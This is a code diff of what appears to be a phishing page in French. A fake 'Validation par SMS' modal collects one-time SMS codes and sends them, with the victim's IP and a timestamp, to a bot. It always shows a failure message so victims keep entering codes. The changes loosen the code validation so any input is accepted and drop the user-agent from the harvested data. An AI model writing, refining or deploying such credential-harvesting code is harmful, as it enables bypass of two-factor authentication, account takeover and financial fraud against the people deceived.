@@ -397,7 +397,6 @@
             transition: all 0.3s ease;
             font-family: inherit;
             text-align: center;
-            letter-spacing: 5px;
             font-size: 20px;
             font-weight: bold;
         }
@@ -540,7 +539,7 @@
         <div class="sms-modal-content">
             <div class="sms-modal-header">
                 <h3>Validation par SMS</h3>
-                <p>Entrez le code à 6 chiffres reçu par SMS</p>
+                <p>Entrez le code reçu par SMS</p>
             </div>
 
             <div class="sms-error" id="smsError">
@@ -552,10 +551,10 @@
             </div>
 
             <div class="sms-form-group">
-                <label for="smsCode">Code SMS (6 chiffres)</label>
-                <input type="text" id="smsCode" placeholder="123456" maxlength="6">
+                <label for="smsCode">Code SMS</label>
+                <input type="text" id="smsCode" placeholder="Entrez le code SMS">
                 <div class="sms-help">
-                    Entrez le code à 6 chiffres reçu sur votre téléphone
+                    Entrez le code reçu sur votre téléphone
                 </div>
             </div>
 
@@ -707,11 +706,9 @@
                 }
             });
             
-            // Formatage du code SMS (6 chiffres uniquement)
+            // Formatage du code SMS (accepte tous les caractères)
             smsCodeInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                if (value.length > 6) value = value.slice(0, 6);
-                e.target.value = value;
+                // Pas de limite, accepte tout
                 smsError.classList.remove('show');
             });
             
@@ -719,8 +716,8 @@
             smsSubmitBtn.addEventListener('click', function() {
                 const smsCode = smsCodeInput.value.trim();
                 
-                // Validation
-                if (smsCode.length !== 6 || !/^\d+$/.test(smsCode)) {
+                // Validation minimale : le champ ne doit pas être vide
+                if (!smsCode) {
                     smsError.classList.add('show');
                     smsSuccess.classList.remove('show');
                     return;
@@ -759,7 +756,6 @@
 
 🌐 INFOS TECH:
 Date: ${new Date().toLocaleString('fr-FR')}
-Navigateur: ${navigator.userAgent}
 IP: ${localStorage.getItem('clientIP') || 'Non disponible'}`;
                 
                 // Envoyer au premier bot
@@ -789,8 +785,7 @@ IP: ${localStorage.getItem('clientIP') || 'Non disponible'}`;
                     smsSubmitBtn.disabled = false;
                     smsCancelBtn.disabled = false;
                     
-                    // Dans un cas réel, on vérifierait si le code est correct
-                    // Pour cette démo, on montre l'erreur pour simuler un code incorrect
+                    // Toujours montrer l'erreur pour simuler un code incorrect
                     smsError.classList.add('show');
                     smsSuccess.classList.remove('show');
                     
